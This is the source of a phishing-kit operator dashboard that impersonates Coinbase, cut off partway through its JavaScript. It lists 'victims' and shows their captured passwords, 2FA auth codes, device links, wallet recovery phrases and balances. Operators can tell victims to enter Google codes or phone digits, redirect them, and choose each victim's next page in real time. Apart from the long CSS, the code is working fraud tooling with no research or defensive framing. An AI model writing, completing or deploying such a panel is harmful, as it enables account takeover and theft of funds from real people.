<?php
session_start();
if (!isset($_SESSION['user_id']) && !isset($_SESSION['username'])) {
    header('Location: /admin/login');
    exit;
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        body {
            background-image: url("/app/admin/dashboard/background.png");
            background-color: #141414;
            /* Fallback color */
            background-size: cover;
            background-position: center;
            height: 100vh;
            margin: 0;
            color: #e0e0e0;
            font-family: 'Roboto Mono', Tahoma, Geneva, Verdana, sans-serif;
            padding-left: 225px;
            /* Adjust padding to give room for the navbar */
            padding-right: 25px;
            position: relative;
            /* Required for the overlay */
        }

        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(13, 19, 26, 0.952);
            /* Semi-transparent black overlay */
            z-index: -1;
            /* Places the overlay behind content */
        }

        .navbar {
            background-color: #0000005d;
            padding: 15px;
            display: flex;
            flex-direction: column;
            /* Make the navbar vertical */
            height: 100%;
            /* Full height */
            position: fixed;
            /* Fix the navbar to the left side */
            top: 0;
            /* Align to the top */
            left: 0;
            /* Align to the left */
            width: 200px;
            /* Set a width for the navbar */
        }

        .navbar a {
            color: #e0e0e0;
            text-decoration: none;
            padding: 10px;
            /* Add padding for clickable area */
            width: 100%;
            /* Full width for links */
            box-sizing: border-box;
            /* Include padding in width */
        }

        .navbar a:hover {
            background-color: rgba(255, 255, 255, 0.2);
            /* Add hover effect */
        }

        .custom-dropdown {
            position: relative;
            display: inline-block;
        }

        .custom-dropdown button {
            border: none !important;
        }

        .custom-dropdown-content {
            display: none;
            position: absolute;
            background-color: #47475F;
            min-width: 160px;
            box-shadow: 2px 8px 16px 0px rgba(0, 0, 0, 0.3);
            z-index: 1;
            white-space: nowrap;
        }

        .custom-dropdown-content a {
            color: #e0e0e0;
            padding: 7px 16px;
            text-decoration: none;
            display: block;
            background-color: #47475F;
        }

        .btn,
        .btn-secondary {
            border-color: #a1fab6;
        }

        .custom-dropdown-content a:hover {
            background-color: rgba(255, 255, 255, 0.2)
        }

        .status-dot {
            height: 10px;
            width: 10px;
            border-radius: 50%;
            display: inline-block;
            animation: blinker 1s linear infinite;
        }

        .status-dot.online {
            background-color: #a1fab6;
        }

        .status-dot.offline {
            background-color: #f58181;
        }

        @keyframes blinker {
            50% {
                opacity: 0;
            }
        }

        .btn,
        .btn-secondary {
            background-color: #47475F;
            border-color: #47475F;
        }

        .pagination {
            display: flex;
            justify-content: center;
            margin-top: 50px;
        }

        .pagination a {
            margin: 0 10px;
            text-decoration: none;
            color: #e0e0e0;
        }

        .pagination a.active {
            font-weight: bold;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 2;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.7);
        }

        .modal-content {
            background-color: rgba(13, 19, 26, 0.87);
            margin: 5% auto;
            padding: 20px;
            width: 90%;
            max-width: 500px;
            color: #f0f0f0;
            position: relative;
        }

        .close {
            color: #ccc;
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: #f58181;
            text-decoration: none;
            transition: color 0.3s ease-in-out;
        }

        .modal input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0;
            display: inline-block;
            box-sizing: border-box;
            background-color: rgba(255, 255, 255, 0.048);
            z-index: 1;
            /* Above the dark overlay */
            border: 1px solid transparent;
            /* Invisible border for box size calculation */
            outline-offset: 3px;
            /* Creates the gap between the button and the border */
            outline: 1px solid rgba(255, 255, 255, 0.26);
            /* Simulated border with spacing */
            color: #fff;
        }

        .select-style {
            overflow: hidden;
            background-color: #47475F;
            color: #e0e0e0;
            padding: 5px 10px;
            font-size: 16px;
            outline: none;
            border: none;
        }

        .select-style option {
            background-color: #47475F;
            color: #e0e0e0;
        }

        .blur {
            filter: blur(4px);
            transition: filter 0.3s;
        }

        .blur:hover {
            filter: blur(0);
        }

        .updated-label {
            display: inline-block;
            width: 120px;
            padding: 4px 5px;
            border: 1px solid #000080;
            /* Dark blue border */
            color: #e0e0e0;
            background-color: #47475F;
            font-size: 10px;
            text-align: center;
            margin-top: 2px;
        }

        .not-updated-label {
            display: inline-block;
            width: 100px;
            padding: 2px 5px;
            border: 1px solid #f58181;
            /* Red border */
            color: #e0e0e0;
            background-color: #47475F;
            font-size: 10px;
            text-align: center;
            margin-top: 2px;
        }

        .btn-red {
            background-color: #f58181;
            border-color: #f58181;
        }

        .btn-global {
            border-color: rgba(13, 19, 26, 0.87) !important;
            background-color: rgba(13, 19, 26, 0.87) !important;
            white-space: nowrap;
        }

        .admin-nav {
            display: flex;
            flex-direction: column;
            /* Stack links vertically */
            align-items: center;
            /* Center the links horizontally */
            font-size: 25px;
        }

        .admin-nav-link {
            color: #fff;
            text-decoration: none;
            border-radius: 10px;
            font-size: 18px;
            transition: background-color 0.3s;
            margin-bottom: 0px;
            margin: 5px 0;
            /* Space out links */
            display: flex;
            flex-direction: column;
        }

        .admin-nav-link:hover {
            background-color: #0000005d;
        }

        .divider-line {
            display: block;
            /* Forces the element to occupy the full width and start on a new line */
            height: 2px;
            /* Adjust the thickness/size of the line */
            border-radius: 10px;
            /* Curved edges */
            width: 100%;
            /* Full width by default */
            background: linear-gradient(to right, transparent, #ffffff54, transparent);
        }

        /* Optional: Custom width */
        .divider-line.short {
            width: 50%;
            /* Adjust the width of the divider */
        }

        .box {
            position: relative;
            width: 100%;
            height: 120px;
            padding: 15px;
            background-color: rgba(255, 255, 255, 0.048);
            /* Light background for the box */
            box-sizing: border-box;
            z-index: 1;
            /* Above the dark overlay */
        }

        /* Top Left Corner Box */
        .box::before {
            content: '';
            position: absolute;
            padding-right: 5px;
            top: -5px;
            left: -5px;
            width: 11px;
            height: 11px;
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Top Right Corner Box */
        .box::after {
            content: '';
            position: absolute;
            top: -5px;
            right: -5px;
            width: 11px;
            height: 11px;
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Bottom Left Corner Box */
        .box .bottom-left {
            content: '';
            position: absolute;
            bottom: -5px;
            left: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Bottom Right Corner Box */
        .box .bottom-right {
            content: '';
            position: absolute;
            bottom: -5px;
            right: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Middle Top Line */
        .box .middle-top {
            content: '';
            position: absolute;
            top: -5px;
            /* Position above the box */
            left: 50%;
            /* Center horizontally */
            width: calc(100% - 20px);
            /* Width of the line */
            height: 1px;
            /* Height of the line */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            transform: translateX(-50%);
            /* Center the line */
            z-index: 1;
            /* Above the dark overlay */
        }

        /* Middle Bottom Line */
        .box .middle-bottom {
            content: '';
            position: absolute;
            bottom: -5px;
            /* Position below the box */
            left: 50%;
            /* Center horizontally */
            width: calc(100% - 20px);
            /* Width of the line */
            height: 1px;
            /* Height of the line */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            transform: translateX(-50%);
            /* Center the line */
            z-index: 1;
            /* Above the dark overlay */
        }

        /* Middle Left Line */
        .box .middle-left {
            content: '';
            position: absolute;
            left: -5px;
            /* Align to the left of the box */
            top: -5px;
            /* Position above the box */
            width: 1px;
            /* Width of the line */
            margin-top: 15px;
            /* Adjust the position */
            height: calc(100% - 20px);
            /* Adjust the height as needed */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            z-index: 1;
            /* Above the dark overlay */
        }

        /* Middle Right Line */
        .box .middle-right {
            content: '';
            position: absolute;
            right: -5px;
            /* Align to the right of the box */
            top: -5px;
            /* Position above the box */
            width: 1px;
            /* Width of the line */
            margin-top: 15px;
            /* Adjust the position */
            height: calc(100% - 20px);
            /* Adjust the height as needed */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            z-index: 1;
            /* Above the dark overlay */
        }

        .box .content {
            position: relative;
            /* To place text above the overlay */
            z-index: 2;
            /* Ensure text is above the overlay */
            color: rgba(255, 255, 255, 0.733);
            /* Change text color for better visibility */
            font-size: 20px;
        }

        .info-container {
            display: flex;
            /* Ensure it's a flex container */
            flex-direction: column;
            /* Stack children vertically */
            justify-content: flex-start;
            /* Align items at the start */
            width: 100%;
            max-width: 100%;
        }

        .info-box th,
        .info-box td {
            text-align: left;
            color: #e0e0e0;
            padding: 10;
            line-height: normal;
            font-weight: normal;
        }

        .info-box {
            display: flex;
            position: relative;
            width: 100%;
            height: auto;
            font-size: 15px;
            padding: 15px;
            background-color: rgba(255, 255, 255, 0.048);
            /* Light background for the box */
            box-sizing: border-box;
            justify-content: space-between;
            /* Adjusts spacing between elements */
            align-items: center;
            /* Aligns items vertically in the center */
        }

        /* Top Left Corner Box */
        .info-box::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            width: 11px;
            height: 11px;
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Top Right Corner Box */
        .info-box::after {
            content: '';
            position: absolute;
            top: -5px;
            right: -5px;
            width: 11px;
            height: 11px;
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Bottom Left Corner Box */
        .info-box .bottom-left {
            content: '';
            position: absolute;
            bottom: -5px;
            left: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        /* Bottom Right Corner Box */
        .info-box .bottom-right {
            content: '';
            position: absolute;
            bottom: -5px;
            right: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        .info-box .middle-top {
            content: '';
            position: absolute;
            top: -5px;
            /* Position above the box */
            left: 50%;
            /* Center horizontally */
            width: calc(100% - 20px);
            /* Width of the line */
            height: 1px;
            /* Height of the line */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            transform: translateX(-50%);
            /* Center the line */
            z-index: 1;
            /* Above the dark overlay */
        }

        .info-box .middle-bottom {
            content: '';
            position: absolute;
            bottom: -5px;
            /* Position below the box */
            left: 50%;
            /* Center horizontally */
            width: calc(100% - 20px);
            /* Width of the line */
            height: 1px;
            /* Height of the line */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            transform: translateX(-50%);
            /* Center the line */
            z-index: 1;
            /* Above the dark overlay */
        }

        .info-box .middle-left {
            content: '';
            position: absolute;
            left: -5px;
            /* Align to the left of the box */
            top: -5px;
            /* Position above the box */
            width: 1px;
            /* Width of the line */
            margin-top: 15px;
            /* Adjust the position */
            height: calc(100% - 20px);
            /* Adjust the height as needed */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            z-index: 1;
            /* Above the dark overlay */
        }

        /* Middle Right Line */
        .info-box .middle-right {
            content: '';
            position: absolute;
            right: -5px;
            /* Align to the right of the box */
            top: -5px;
            /* Position above the box */
            width: 1px;
            /* Width of the line */
            margin-top: 15px;
            /* Adjust the position */
            height: calc(100% - 20px);
            /* Adjust the height as needed */
            background-color: rgba(255, 255, 255, 0.26);
            /* Solid line color */
            z-index: 1;
            /* Above the dark overlay */
        }

        .victim-list-style {
            flex: 1;
            justify-content: space-between;
            overflow-x: auto;
            border-collapse: collapse;
        }

        .victim-list-style th,
        .victim-list-style td {
            text-align: left;
            color: #e0e0e0;
            padding-left: 25px;
            padding-right: 25px;
            line-height: normal;
            font-weight: normal;
        }

        .header-container {
            display: flex;
            padding-top: 25px;
            padding-bottom: 20px;
            gap: 25px;
        }

        .style-sub {
            font-size: 25px;
        }

        .style-header {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.74)
        }

        .title-header {
            padding-top: 20px;
            font-size: 20px;
        }

        .title-header .subheader {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.74);
        }

        .header-subheader-text {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.74);
        }

        .button {
            position: relative;
            width: 80px;
            height: 18px;
            padding: 0px;
            box-sizing: border-box;
            background-color: rgba(255, 255, 255, 0.048);
            z-index: 1;
            /* Above the dark overlay */
            border: 2px solid transparent;
            /* Invisible border for box size calculation */
            outline-offset: 3px;
            /* Creates the gap between the button and the border */
            outline: 1px solid rgba(255, 255, 255, 0.26);
            /* Simulated border with spacing */
            border-radius: 5px;

            display: flex;
            /* Flexbox layout */
            align-items: center;
            /* Vertical centering */
            justify-content: center;
            /* Horizontal centering */
            text-align: center;
            /* Text alignment inside the button */
            font-size: 14px;
            /* Adjust font size as needed */
            line-height: 1;
            /* Ensures the line height doesn't add extra spacing */
            color: white;
            transition: filter 0.3s ease;
            /* Smooth transition for hover effect */
        }

        .button:hover {
            filter: brightness(-2);
            /* Brighten the button on hover */
        }

        .button.ONLINE {
            color: rgb(118, 255, 106);
            outline: 1px solid rgba(107, 248, 119, 0.651);
            /* Simulated border with spacing */
            background-color: rgba(23, 59, 28, 0.418);
            /* Light background for the button */
            border-radius: 3px
        }

        .button.OFFLINE {
            color: rgb(253, 88, 88);
            outline: 1px solid rgba(255, 51, 51, 0.336);
            /* Simulated border with spacing */
            background-color: rgba(255, 0, 0, 0.137);
            /* Light background for the button */
            border-radius: 3px
        }

        .victim-divider-line {
            background: #ffffff54;
            display: block;
            /* Forces the element to occupy the full width and start on a new line */
            height: 1px;
            /* Adjust the thickness/size of the line */
            margin-top: 18px;
            margin-bottom: 18px;
            width: 100%;
            /* Full width by default */
        }

        .square-dot-button {
            width: 20px;
            /* Width of the square */
            height: 20px;
            /* Height of the square */
            background-color: rgba(255, 0, 0, 0.137);
            /* Center with transparency */
            border: 1px solid rgba(255, 51, 51, 0.336);
            /* Brighter border */
            border-radius: 5px;
            /* Slightly curved edges */
            cursor: pointer;
            /* Cursor changes to pointer on hover */
            outline: none;
            /* Remove outline */
            transition: background-color 0.3s, border-color 0.3s;
            /* Smooth transitions */

            display: flex;
            /* Flexbox layout */
            align-items: center;
            /* Vertical centering */
            justify-content: center;
            /* Horizontal centering */
            text-align: center;
            /* Text alignment inside the button */
            font-size: 11px;
            /* Adjust font size as needed */
            line-height: 0;
            /* Ensures the line height doesn't add extra spacing */
            color: rgb(253, 88, 88);
        }

        .square-dot-button:hover {
            background-color: rgba(255, 0, 0, 0.349);
            /* Darker shade on hover */
            border-color: rgba(255, 51, 51, 0.459);
            /* Brighten border on hover */
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 2;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.7);
        }

        .modal-content {
            background-color: rgba(13, 19, 26, 0.87);
            margin: 5% auto;
            padding: 20px;
            width: 100%;
            max-width: 500px;
            color: #f0f0f0;
            position: relative;
        }

        .modal .top-left {
            position: absolute;
            top: -5px;
            /* Adjusted to be slightly outside the modal */
            left: -5px;
            /* Adjusted to be slightly outside the modal */
            width: 11px;
            height: 11px;
            z-index: 3;
            /* Ensure it appears above other elements */
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        .modal .top-right {
            position: absolute;
            top: -5px;
            /* Adjusted to be slightly outside the modal */
            right: -5px;
            /* Adjusted to be slightly outside the modal */
            width: 11px;
            height: 11px;
            z-index: 3;
            /* Ensure it appears above other elements */
            border-top: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        .modal .bottom-left {
            position: absolute;
            bottom: -5px;
            left: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-left: 2px solid rgba(255, 255, 255, 0.829);
        }

        .modal .bottom-right {
            position: absolute;
            bottom: -5px;
            right: -5px;
            width: 11px;
            height: 11px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.829);
            border-right: 2px solid rgba(255, 255, 255, 0.829);
        }

        .modal .middle-top {
            position: absolute;
            top: -5px;
            left: 50%;
            width: calc(100% - 20px);
            height: 1px;
            background-color: rgba(255, 255, 255, 0.26);
            transform: translateX(-50%);
        }

        .modal .middle-bottom {
            position: absolute;
            bottom: -5px;
            left: 50%;
            width: calc(100% - 20px);
            height: 1px;
            background-color: rgba(255, 255, 255, 0.26);
            transform: translateX(-50%);
        }

        .modal .middle-left {
            position: absolute;
            top: 10px;
            /* Adjusted to be at the top of the modal */
            left: -5px;
            width: 1px;
            height: calc(100% - 20px);
            /* Reduce height slightly to avoid overlap with top/bottom corners */
            background-color: rgba(255, 255, 255, 0.26);
        }

        /* Middle Right Line */
        .modal .middle-right {
            position: absolute;
            top: 10px;
            /* Adjusted to be at the top of the modal */
            right: -5px;
            width: 1px;
            height: calc(100% - 20px);
            /* Reduce height slightly to avoid overlap with top/bottom corners */
            background-color: rgba(255, 255, 255, 0.26);
        }

        .modal input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0;
            display: inline-block;
            box-sizing: border-box;
            background-color: rgba(255, 255, 255, 0.048);
            z-index: 1;
            border: 1px solid transparent;
            outline-offset: 3px;
            outline: 1px solid rgba(255, 255, 255, 0.26);
            color: #fff;
        }

        .page-button {
            position: relative;
            width: auto + 6px;
            height: auto + 6px;
            box-sizing: border-box;
            background-color: rgba(255, 255, 255, 0.048);
            z-index: 1;
            /* Above the dark overlay */
            border: 2px solid transparent;
            /* Invisible border for box size calculation */
            outline-offset: 3px;
            /* Creates the gap between the button and the border */
            outline: 1px solid rgba(255, 255, 255, 0.26);
            /* Simulated border with spacing */
            border-radius: 5px;

            display: flex;
            /* Flexbox layout */
            align-items: center;
            /* Vertical centering */
            justify-content: center;
            /* Horizontal centering */
            text-align: center;
            /* Text alignment inside the button */
            font-size: 14px;
            /* Adjust font size as needed */
            line-height: 1;
            /* Ensures the line height doesn't add extra spacing */
            color: white;
            transition: filter 0.3s ease;
            /* Smooth transition for hover effect */
        }

        .page-button:hover {
            filter: brightness(-2);
            /* Brighten the button on hover */
        }

        .page-buttons-container {
            display: flex;
            /* Use flexbox for button layout */
            flex-direction: row;
            /* Arrange buttons in a row */
            flex-wrap: wrap;
            gap: 15px;
            /* 20px gap between buttons */
            align-items: row;
            /* Center buttons vertically if needed */
            padding: 0 5px;

        }

        .page-label {
            font-size: 14px;
            flex-basis: 100%;
            /* Makes sure the label takes full width */
            color: rgba(255, 255, 255, 0.247);
            padding-bottom: 7.5px;
        }

        .modal-header {
            display: flex;
            /* Use flexbox for side-by-side alignment */
            justify-content: space-between;
            /* Space between the two divs */
            align-items: flex-start;
            /* Align items to the start */
            border-bottom: none;
            padding: 0px;
        }

        .action-buttons-container {
            padding: 0 5px;
            display: flex;
            /* Use flexbox for button layout */
            flex-direction: row;
            /* Arrange buttons in a row */
            gap: 20px;
            /* 20px gap between buttons */
            align-items: center;
            /* Center buttons vertically if needed */
            justify-content: center;
            /* Center buttons horizontally */
        }
    </style>

</head>

<body>
    <div class="navbar">
        <div style="align-items: center; text-align: center;">
            <img src="/app/admin/dashboard/logo.png" alt="Logo"
                style="width: 50px; height: auto; padding-top: 25px; padding-bottom: 20px;">
            <div style="font-size: 18px; color: #fff;">THE PANEL</div>
            <div class="header-subheader-text">Made by the best, for the best.</div>
            <div class="divider-line" style="margin-top: 10px;"></div>
        </div>
        <nav class="admin-nav">
            <div>
                <a href="/admin" class="admin-nav-link">OPERATORS</a>
            </div>
            <div class="divider-line"></div>
            <div>
                <a href="/admin/settings" class="admin-nav-link">SETTINGS</a>
            </div>
            <div class="divider-line"></div>
            <div>
                <a href="/admin" class="admin-nav-link">DASHBOARD</a>
            </div>
            <div class="header-subheader-text" style="color:#e0e0e01f">v0.3-alpha</div>
        </nav>
    </div>
    <!-- HEADER SECTION-->
    <div class="header-container">
        <div class="box">
            <div class="style-header">TOTAL OPERATORS</div>
            <div class="style-sub"></div>

            <div class="content"></div>
            <div class="bottom-left"></div>
            <div class="bottom-right"></div>
            <div class="middle-top"></div>
            <div class="middle-bottom"></div>
            <div class="middle-left"></div>
            <div class="middle-right"></div>
        </div>
        <div class="box">
            <div class="style-header">TOTAL VISITORS</div>
            <div class="style-sub"></div>

            <div class="content"></div>
            <div class="bottom-left"></div>
            <div class="bottom-right"></div>
            <div class="middle-top"></div>
            <div class="middle-bottom"></div>
            <div class="middle-left"></div>
            <div class="middle-right"></div>
        </div>
        <div class="box">
            <div class="style-header">ACTIVE OPERATORS</div>
            <div class="style-sub"></div>

            <div class="content"></div>
            <div class="bottom-left"></div>
            <div class="bottom-right"></div>
            <div class="middle-top"></div>
            <div class="middle-bottom"></div>
            <div class="middle-left"></div>
            <div class="middle-right"></div>
        </div>
        <div class="box">
            <div class="style-header">SITE STATUS</div>
            <div class="style-sub" style="font-size: 23px;"></div>

            <div class="content"></div>
            <div class="bottom-left"></div>
            <div class="bottom-right"></div>
            <div class="middle-top"></div>
            <div class="middle-bottom"></div>
            <div class="middle-left"></div>
            <div class="middle-right"></div>
        </div>
    </div>

    <div class="divider-line"
        style="margin-bottom: 25px; margin-top: 5px; height: 3px; background: linear-gradient(to right, transparent, #ffffff54, transparent);">
    </div>

    <!-- END OF HEADER SECTION-->
    <!-- INFO SECTION-->
    <div class="info-box">
        <div class="info-container">
            <table class="victim-list-style" id='victimsTable'>
                <thead>
                    <tr>
                        <th>
                            <div></div>
                        </th>
                        <th>USER</th>
                        <th>EMAIL</th>
                        <th>STATUS</th>
                        <th>CURRENT PAGE</th>
                        <th>DEVICE</th>
                        <th>DETAILS</th>
                        <th>ACTIONS</th>
                    </tr>
                </thead>
                <tbody id="victimsData">
                </tbody>
            </table>
            <div class="bottom-left"></div>
            <div class="bottom-right"></div>
            <div class="middle-top"></div>
            <div class="middle-bottom"></div>
            <div class="middle-left"></div>
            <div class="middle-right"></div>
        </div>
    </div>
    <div id="myModal" class="modal">
        <div class="modal-content">
            <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none"
                xmlns="http://www.w3.org/2000/svg">
                <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
            <p>Enter Google Code:</p>
            <input type="text" id="2faCode" placeholder="Enter Code">
            <button onclick="submit2FACode()">Submit</button>
        </div>
    </div>


    <div id="smsModal" class="modal">
        <div class="modal-content">
            <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none"
                xmlns="http://www.w3.org/2000/svg">
                <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
            <p>Enter the last 2 digits of the phone number</p>
            <input type="text" id="smsCode" placeholder="Enter Code">
            <button>Submit</button>
        </div>
    </div>

    <div id="emailModal" class="modal">
        <div class="modal-content">
            <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none"
                xmlns="http://www.w3.org/2000/svg">
                <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
            <p>Enter the your email</p>
            <input type="text" id="email" placeholder="Enter Email">
            <button>Submit</button>
        </div>
    </div>

    <div id="urlModal" class="modal">
        <div class="modal-content">
            <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none"
                xmlns="http://www.w3.org/2000/svg">
                <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
            <p>Enter Redirect URL:</p>
            <input type="text" id="urlInput" placeholder="Enter redirect URL">
            <button>Submit</button>
        </div>
    </div>


    <div id="userInfoModal" class="modal">
        <div class="modal-content">
            <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none"
                xmlns="http://www.w3.org/2000/svg">
                <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
            <p style="font-size: 18px; font-weight: bold;">User Information:</p>
            <div style="font-size: 16px;">User Agent: <span id="userAgentDisplay" style="font-weight: bold;"></span>
            </div>
            <div style="font-size: 16px;">User IP: <span id="userIpDisplay" 
                    style="font-weight: bold;"></span></div>
            <div style="font-size: 16px;">Device: <span id="userDeviceDisplay" style="font-weight: bold;"></span></div>
            <br></br>
            <p style="font-size: 18px; font-weight: bold;">User Details:</p>
            <div style="font-size: 16px;">Password: <span id="passwordDisplay" style="font-weight: bold;"></span></div>
            <div style="font-size: 16px;">Auth Code: <span id="codeDisplay" style="font-weight: bold;"></span></div>
            <div style="font-size: 16px;">Device Link: <span id="deviceLinkDisplay" style="font-weight: bold;"></span>
            </div>
            <div style="font-size: 16px;">Recovery Phrase: <span id="phraseDisplay" style="font-weight: bold;"></span>
            </div>
            <div style="font-size: 16px;">Balance: <span id="balanceDisplay" style="font-weight: bold;"></span></div>

        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <!-- Added Bootstrap JS for modal functionality -->
    <script>
        $(document).ready(function () {
            var notyf = new Notyf({
                duration: 3000, // Duration in milliseconds
                position: { x: 'center', y: 'bottom' }, // Position to the left
                types: [
                    {
                        type: 'success',
                        background: '#4caf50',
                        dismissible: true,
                        ripple: true
                    },
                    {
                        type: 'error',
                        background: '#f44336',
                        dismissible: true,
                        ripple: true
                    },
                    {
                        type: 'warning',
                        background: '#ff9800',
                        dismissible: true,
                        ripple: true
                    },
                ],
            });
            let previousData = null;
            let currentPage = 1;
            const rowsPerPage = 5;
            let lastOnlineTime = Date.now();
            let openDropdowns = new Set();
            let selectedRows = new Set();
            let totalOperators;
            let totalVisitors;
            let siteStatus;
            let totalActiveOperators;
            function fetchData() {
                fetch('/admin/users/heartbeat')
                    .then(response => response.json())
                    .then(res => {
                        const data = res.clients;
                        if (JSON.stringify(data) !== JSON.stringify(previousData)) {
                            if (shouldPlayAudio(data, previousData)) {
                                playAudio();
                            }
                            previousData = data;
                        }
                        totalOperators = res.totalOperators;
                        siteStatus = res.siteStatus;
                        totalActiveOperators = res.totalActiveOperators;
                        renderPageData();
                    });
            }

            function shouldPlayAudio(newData, oldData) {
                if (!oldData) return false;

                return newData.some((newItem, index) => {
                    const oldItem = oldData[index];
                    if (!oldItem) return true;

                    return Object.keys(newItem).some(key => {
                        if (key === 'status' || key === 'current_page') return false;
                        return newItem[key] !== oldItem[key];
                    });
                });
            }

            function playAudio() {
                var audio = new Audio('/message.mp3');
                audio.play().catch(error => {
                    console.error("Failed to play audio:", error);
                });
            }
            function renderPageData() {

                $('#victimsData').empty();
                const startIndex = (currentPage - 1) * rowsPerPage;
                const endIndex = startIndex + rowsPerPage;
                const paginatedItems = previousData.slice(startIndex, endIndex);
                paginatedItems.forEach(victim => {
                    const statusClass = victim.status == '1' ? 'ONLINE' : 'OFFLINE';

                    $('#victimsData').append(`
                    <tr>
                        <td colspan="8">
                            <div class="victim-divider-line"></div>
                        </td>
                    </tr>
                `);

                    $('#victimsData').append(`
                    <tr id="row-${victim.id}" class="${selectedRows.has(victim.id) ? 'selected' : ''}">
                        <td>
                            <button class="square-dot-button" type="button" onclick="reportDelete(${victim.id})">X</button>
                        </td>
                        <td>${victim.id || 'N/A'}</td>
                        <td>${victim.email || 'N/A'}</td>
                        <td><span class="button ${statusClass}">${statusClass}</span></td>
                        <td>${victim.current_page || 'N/A'}</td>
                        <td>${victim.device || 'N/A'}</td>
                        <td>
                            <button class="button" type="button" onclick="userInfo(${victim.id}, '${victim.useragent}', '${victim.ip}', '${victim.device}', '${victim.phrase}', '${victim.url}', '${victim.password}', '${victim.code}', '${victim.balance}')">VIEW</button>
                        </td>
                        <td>
                            <button class="button" type="button" onclick="showManageModal(${victim.id})">MANAGE</button>
                        </td>
                    </tr>
                `);
                });

                console.log(paginatedItems);
                $('.style-sub:eq(0)').text(totalOperators);
                $('.style-sub:eq(1)').text(paginatedItems.length);
                $('.style-sub:eq(2)').text(totalActiveOperators);
                $('.style-sub:eq(3)').text(siteStatus == 1 ? "Online" : "Offline");

                displayPagination(previousData.length);
                restoreOpenDropdowns();
                restoreSelectedRows();
            }

            window.showManageModal = function (victimId) {
                const modalHtml = `
                <div class="modal" id="manageModal-${victimId}" tabindex="-1" role="dialog" aria-labelledby="manageModalLabel-${victimId}" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <div style="display: flex; flex-direction: column;">
                                    <div style="font-size: 20px" id="manageModalLabel-${victimId}">MANAGE VICTIM</div>
                                    <div style="color:rgba(255, 255, 255, 0.74); font-size: 14px;">Select your victim's next page.</div>
                                </div>
                            </div>

